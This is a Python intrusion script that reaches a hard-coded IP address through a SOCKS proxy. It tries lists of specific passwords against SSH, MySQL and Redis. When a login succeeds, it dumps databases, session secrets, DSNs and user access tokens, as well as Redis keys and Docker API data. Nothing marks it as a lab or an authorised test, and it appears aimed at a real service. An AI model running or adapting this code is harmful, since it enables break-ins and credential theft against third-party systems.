#!/usr/bin/env python3
"""Service interrogation for whatever TCP ports the WARP sweep found open on TARGET."""
import os, socket, json, time, ssl
import socks

TARGET = os.environ.get("TARGET", "135.148.204.37")
PHP = os.environ.get("PX_HOST", "127.0.0.1")
PPP = int(os.environ.get("PX_PORT", "40000"))
SCAN = os.environ.get("SCAN", "results_scan.json")
OUT = os.environ.get("OUT", "results_svc.json")

MYSQL_CREDS = [
    ("root", "6iHKLZEmQQ4BesSg"),
    ("root", "NewSecurePassword123!"),
    ("root", "12345678"),
    ("root", "xinhuo.yibuapi!@#"),
    ("root", "N+eMY8*[H#y<WC8Q+%JayP+<f)vV[phC"),
    ("yibuapi", "xinhuo.yibuapi!@#"),
    ("haochi", "12345678"),
]
REDIS_CREDS = ["", "N+eMY8*[H#y<WC8Q+%JayP+<f)vV[phC", "6iHKLZEmQQ4BesSg", "NewSecurePassword123!", "12345678"]
SSH_CREDS = [("root", "6iHKLZEmQQ4BesSg"), ("root", "NewSecurePassword123!"), ("root", "12345678"),
             ("root", "xinhuo.yibuapi!@#"), ("root", "N+eMY8*[H#y<WC8Q+%JayP+<f)vV[phC"),
             ("ubuntu", "NewSecurePassword123!"), ("admin", "NewSecurePassword123!")]

def sock_open(port, timeout=12):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    s.set_proxy(socks.SOCKS5, PHP, PPP, rdns=True)
    s.settimeout(timeout)
    s.connect((TARGET, port))
    return s

def recv_some(s, n=4096, timeout=6):
    s.settimeout(timeout)
    try:
        d = s.recv(n)
    except socket.timeout:
        return b""
    except Exception:
        return b""
    return d

def http_req(port, path="/", host=None, tls=False, timeout=12, extra=b""):
    s = None
    try:
        s = sock_open(port, timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=TARGET if not host else host)
        req = (f"GET {path} HTTP/1.1\r\nHost: {host or TARGET}\r\nUser-Agent: curl/8.5\r\n"
               f"Accept: */*\r\nConnection: close\r\n\r\n").encode() + extra
        s.sendall(req)
        data = b""
        s.settimeout(timeout)
        while len(data) < 60000:
            try:
                c = s.recv(8192)
            except socket.timeout:
                break
            if not c:
                break
            data += c
        head, _, body = data.partition(b"\r\n\r\n")
        return {"status_line": head.split(b"\r\n")[0].decode("latin1", "replace") if head else "",
                "headers": head.decode("latin1", "replace")[:2000],
                "body": body[:3000].decode("latin1", "replace"),
                "tls": tls}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}
    finally:
        if s:
            try: s.close()
            except Exception: pass

def probe_ssh(port):
    out = {"port": port, "kind": "ssh"}
    try:
        s = sock_open(port, 12)
        banner = recv_some(s, 512, 8)
        out["banner"] = banner.decode("latin1", "replace").strip()
        s.close()
    except Exception as e:
        out["banner_error"] = f"{type(e).__name__}: {e}"
        return out
    try:
        import paramiko
        out["auth_attempts"] = []
        for u, p in SSH_CREDS:
            try:
                sk = sock_open(port, 15)
                tr = paramiko.Transport(sk)
                tr.start_client(timeout=15)
                out["server_version"] = tr.remote_version
                try:
                    tr.auth_password(u, p)
                    out["auth_attempts"].append({"user": u, "ok": True})
                    out["SUCCESS"] = {"user": u, "password": p}
                    tr.close(); sk.close()
                    break
                except paramiko.AuthenticationException as ae:
                    methods = getattr(ae, "allowed_methods", None)
                    out["auth_attempts"].append({"user": u, "ok": False, "err": "auth_failed", "allowed": list(methods) if methods else None})
                except Exception as ae:
                    out["auth_attempts"].append({"user": u, "ok": False, "err": f"{type(ae).__name__}: {ae}"})
                finally:
                    try: tr.close()
                    except Exception: pass
                    try: sk.close()
                    except Exception: pass
            except Exception as e:
                out["auth_attempts"].append({"user": u, "err": f"conn {type(e).__name__}: {e}"})
    except ImportError:
        out["paramiko"] = "missing"
    return out

def probe_mysql(port):
    out = {"port": port, "kind": "mysql"}
    try:
        s = sock_open(port, 12)
        greet = recv_some(s, 1024, 8)
        s.close()
        out["greeting_hex_head"] = greet[:60].hex()
        if greet and greet[4:5] == b"\n":
            out["version"] = greet[5:greet.find(b"\x00", 5)].decode("latin1", "replace")
    except Exception as e:
        out["greet_error"] = f"{type(e).__name__}: {e}"
        return out
    try:
        import pymysql
    except ImportError:
        out["pymysql"] = "missing"
        return out
    out["auth_attempts"] = []
    for u, p in MYSQL_CREDS:
        try:
            sk = sock_open(port, 15)
            conn = pymysql.connect(user=u, password=p, host=TARGET, port=port, sock=sk,
                                   connect_timeout=12, read_timeout=20, write_timeout=20,
                                   charset="utf8mb4")
        except Exception as e:
            out["auth_attempts"].append({"user": u, "ok": False, "err": f"{type(e).__name__}: {str(e)[:160]}"})
            continue
        out["auth_attempts"].append({"user": u, "ok": True})
        out["SUCCESS_CREDS"] = {"user": u, "password": p}
        try:
            cur = conn.cursor()
            cur.execute("SELECT VERSION(), @@hostname, @@port, USER()")
            out["server"] = [str(x) for x in cur.fetchone()]
            cur.execute("SHOW DATABASES")
            dbs = [r[0] for r in cur.fetchall()]
            out["databases"] = dbs
            cand = [d for d in dbs if d not in ("information_schema", "mysql", "performance_schema", "sys")]
            tables = {}
            for d in cand:
                try:
                    cur.execute(f"SELECT table_name FROM information_schema.tables WHERE table_schema=%s", (d,))
                    tables[d] = [r[0] for r in cur.fetchall()][:80]
                except Exception as e:
                    tables[d] = f"err {e}"
            out["tables"] = tables
            # find the target instance DB
            hits = []
            for d in cand:
                tl = tables.get(d) or []
                if isinstance(tl, list) and "options" in tl:
                    try:
                        cur.execute(f"SELECT `key`, LEFT(`value`,300) FROM `{d}`.options WHERE `key` IN ('SystemName','TurnstileSiteKey','SystemNameEn','ServerAddress','SQL_DSN','SESSION_SECRET')")
                        rowd = dict((str(k), str(v)) for k, v in cur.fetchall())
                        hits.append({"db": d, "options": rowd})
                    except Exception as e:
                        hits.append({"db": d, "opt_err": str(e)[:160]})
                if isinstance(tl, list) and "users" in tl:
                    try:
                        cur.execute(f"SELECT id,username,role,LEFT(access_token,60),status FROM `{d}`.users ORDER BY role DESC, id ASC LIMIT 30")
                        rows = cur.fetchall()
                        hits.append({"db": d, "users": [[str(x) for x in r] for r in rows],
                                     "user_count": None})
                        cur.execute(f"SELECT COUNT(*) FROM `{d}`.users")
                        hits[-1]["user_count"] = str(cur.fetchone()[0])
                    except Exception as e:
                        hits.append({"db": d, "user_err": str(e)[:160]})
            out["target_hits"] = hits
        except Exception as e:
            out["query_error"] = f"{type(e).__name__}: {str(e)[:200]}"
        finally:
            try: conn.close()
            except Exception: pass
        break
    return out

def redis_cmd(s, *args, timeout=8):
    parts = [f"*{len(args)}\r\n".encode()]
    for a in args:
        b = a.encode() if isinstance(a, str) else a
        parts.append(f"${len(b)}\r\n".encode() + b + b"\r\n")
    s.sendall(b"".join(parts))
    s.settimeout(timeout)
    data = b""
    try:
        while len(data) < 20000:
            c = s.recv(4096)
            if not c: break
            data += c
            if len(c) < 4096: break
    except socket.timeout:
        pass
    return data

def probe_redis(port):
    out = {"port": port, "kind": "redis"}
    try:
        s = sock_open(port, 12)
        out["PING"] = redis_cmd(s, "PING").decode("latin1", "replace")[:400]
        auth_ok = None
        if out["PING"].startswith("-NOAUTH") or out["PING"].startswith("-ERR"):
            for pw in REDIS_CREDS[1:]:
                r = redis_cmd(s, "AUTH", pw).decode("latin1", "replace")
                out.setdefault("auth_attempts", []).append({"pw_len": len(pw), "resp": r[:80]})
                if r.startswith("+OK"):
                    auth_ok = pw
                    out["SUCCESS_PASSWORD"] = pw
                    break
        else:
            auth_ok = ""
        if auth_ok is not None:
            out["INFO"] = redis_cmd(s, "INFO", "server").decode("latin1", "replace")[:1500]
            out["DBSIZE"] = redis_cmd(s, "DBSIZE").decode("latin1", "replace")[:100]
            out["KEYS"] = redis_cmd(s, "KEYS", "*").decode("latin1", "replace")[:2000]
            out["CONFIG_GET"] = redis_cmd(s, "CONFIG", "GET", "dir").decode("latin1", "replace")[:400]
        s.close()
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
    return out

def probe_generic(port):
    out = {"port": port, "kind": "generic"}
    try:
        s = sock_open(port, 10)
        try:
            s.sendall(b"\r\n")
        except Exception:
            pass
        d = recv_some(s, 2048, 6)
        out["banner"] = d[:600].decode("latin1", "replace")
        s.close()
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
    return out

def main():
    opens = []
    try:
        sc = json.load(open(SCAN))
        opens += sc.get("open_key_ports") or []
        opens += sc.get("full_open") or []
    except Exception as e:
        print("scan read err", e)
    opens = sorted(set(int(p) for p in opens))
    print("OPEN PORTS:", opens, flush=True)
    res = []
    for p in opens:
        t0 = time.time()
        if p == 22 or p == 2222:
            r = probe_ssh(p)
        elif p in (3306,):
            r = probe_mysql(p)
        elif p in (6379, 6380, 16379):
            r = probe_redis(p)
        elif p in (80, 443, 2375, 2376, 2377, 3000, 3001, 3100, 5000, 8000, 8080, 8081, 8443,
                   9000, 9001, 9090, 9091, 9100, 9113, 9200, 5601, 15672, 8161, 10000, 18080):
            r = http_req(p, "/")
            r["port"] = p; r["kind"] = "http"
            if p in (443, 8443):
                r["tls_try"] = http_req(p, "/api/status", tls=True)
            if p in (2375, 2376):
                r["docker_version"] = http_req(p, "/version", tls=(p == 2376))
                r["docker_containers"] = http_req(p, "/containers/json", tls=(p == 2376))
            if p in (9100, 9113):
                r["metrics"] = http_req(p, "/metrics")
        else:
            r = probe_generic(p)
        r["elapsed_ms"] = int((time.time() - t0) * 1000)
        print(json.dumps(r)[:900], flush=True)
        res.append(r)
        with open(OUT, "w") as f:
            json.dump({"target": TARGET, "open_ports": opens, "results": res}, f, indent=1)
    with open(OUT, "w") as f:
        json.dump({"target": TARGET, "open_ports": opens, "results": res}, f, indent=1)
    print("SVC DONE", flush=True)

if __name__ == "__main__":
    main()